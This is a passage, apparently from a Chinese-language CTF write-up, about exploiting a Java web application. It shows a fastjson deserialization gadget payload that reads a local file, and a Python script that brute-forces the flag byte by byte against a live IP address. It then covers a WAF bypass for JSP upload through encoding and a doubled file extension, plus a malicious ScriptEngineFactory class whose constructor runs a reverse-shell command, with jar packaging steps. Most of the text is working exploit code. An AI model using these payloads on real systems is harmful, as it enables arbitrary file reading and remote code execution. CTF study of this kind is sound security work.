                "bytes": [66]
            }]
        },
        "address": {
            "$ref": "$.abc.BOM"
        }
    }
文章中的payload是这样的，我们给他外面套上一层
    [{"password":{"abc":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"file:///flag"},"charsetName":"UTF-8","bufferSize":1024},"boms":[{"charsetName":"UTF-8","bytes":[76]}]},"address":{"$ref":"$.abc.BOM"}}}]
这样就有回显了。根据回显盲注出flag
    import requests
    session = requests.session()
    burp0_url = "http://124.71.173.23:8088/dynamic_table"
    burp0_cookies = {"JSESSIONID": "129453A7ADA22FE7EFCA43989BBD7DB3"}
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                     "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                     "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
                     "Origin": "http://124.71.173.23:8088", "Connection": "close",
                     "Referer": "http://124.71.173.23:8088/dynamic_table", "Upgrade-Insecure-Requests": "1"}
    lllll = ['76']
    proxies = {
        "http": "http://127.0.0.1:8084",
        "https": "http://127.0.0.1:8084"
    }
    for i in range(45):
        for j in range(32, 127):
            burp0_data = {
                "data": "[{\"password\":{\"abc\":{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.apache.commons.io.input.BOMInputStream\",\"delegate\":{\"@type\":\"org.apache.commons.io.input.ReaderInputStream\",\"reader\":{\"@type\":\"jdk.nashorn.api.scripting.URLReader\",\"url\":\"file:///flag\"},\"charsetName\":\"UTF-8\",\"bufferSize\":1024},\"boms\":[{\"charsetName\":\"UTF-8\",\"bytes\":[" + ",".join(
                    lllll)+','+str(j)+"]}]},\"address\":{\"$ref\":\"$.abc.BOM\"}}}]"}
            r = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data,proxies=proxies)
            if "charsetName" in r.text:
                print(chr(j),end='')
                lllll.append(str(j))
## bypass
jsp文件上传，不能上传可见字符。这里随便一种编码就行，比如UTF-16BE编码。
把这里的代码修改一下，只留下关键代码，来绕过waf。
上传jsp，双写绕后缀
shell.jsjspp
evil中  
EvilScript.java
    import java.io.BufferedReader;
    import java.io.File;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.nio.file.Files;
    import java.nio.file.Paths;
    import java.util.List;
    import javax.script.ScriptEngine;
    import javax.script.ScriptEngineFactory;
    public class EvilScript implements ScriptEngineFactory {
      public EvilScript() throws Throwable {
        StringBuilder stringBuilder = new StringBuilder();
        try {
          Runtime.getRuntime().exec("反弹shell命令");
        } catch (Throwable e) {
          e.printStackTrace();
        }
        throw new Throwable(stringBuilder.toString());
      }
      @Override
      public String getEngineName() {
        return null;
      }
      @Override
      public String getEngineVersion() {
        return null;
      }
      @Override
      public List getExtensions() {
        return null;
      }
      @Override
      public List getMimeTypes() {
        return null;
      }
      @Override
      public List getNames() {
        return null;
      }
      @Override
      public String getLanguageName() {
        return null;
      }
      @Override
      public String getLanguageVersion() {
        return null;
      }
      @Override
      public Object getParameter(String key) {
        return null;
      }
      @Override
      public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
      }
      @Override
      public String getOutputStatement(String toDisplay) {
        return null;
      }
      @Override
      public String getProgram(String... statements) {
        return null;
      }
      @Override
      public ScriptEngine getScriptEngine() {
        return null;
      }
    }
打包
    javac EvilScript.java
    jar -cvf evil.jar META-INF EvilScript.class
jar包结构
上传后访问jsp,反弹shell